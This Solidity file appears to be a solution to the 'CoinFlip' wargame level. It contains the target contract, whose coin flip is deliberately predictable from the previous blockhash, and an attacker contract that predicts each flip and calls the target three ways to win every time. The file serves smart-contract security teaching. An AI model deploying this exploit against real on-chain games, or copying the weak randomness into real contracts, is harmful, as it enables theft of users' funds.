pragma solidity ^0.6.0;

// 由于使用在线版本remix，所以需要
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol";

// 用于使用被调用合约实例（已知被调用合约代码）
contract CoinFlip {
  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

// 用于 使用被调用合约接口实例（仅知道被调用合约接口）
interface CoinFlipInterface {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker{
    
    using SafeMath for uint256;
    address private addr;
    CoinFlip cf_ins;
    CoinFlipInterface cf_interface;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _addr) public {
        addr = _addr;
        cf_ins = CoinFlip(_addr);
        cf_interface = CoinFlipInterface(_addr);
    }

    // 当用户发出请求时，合约在内部先自己做一次运算，得到结果，发起合约内部调用
    function getFlip() private returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        return side;
    }

    // 使用被调用合约实例（已知被调用合约代码）
    function attackByIns() public {
        bool side = getFlip();
        cf_ins.flip(side);
    }

    // 使用被调用合约接口实例（仅知道被调用合约接口）
    function attackByInterface() public {
        bool side = getFlip();
        cf_interface.flip(side);
    }

    // 使用call命令调用合约
    function attackByCall() public {
        bool side = getFlip();
        addr.call(abi.encodeWithSignature("flip(bool)",side));
    }

}
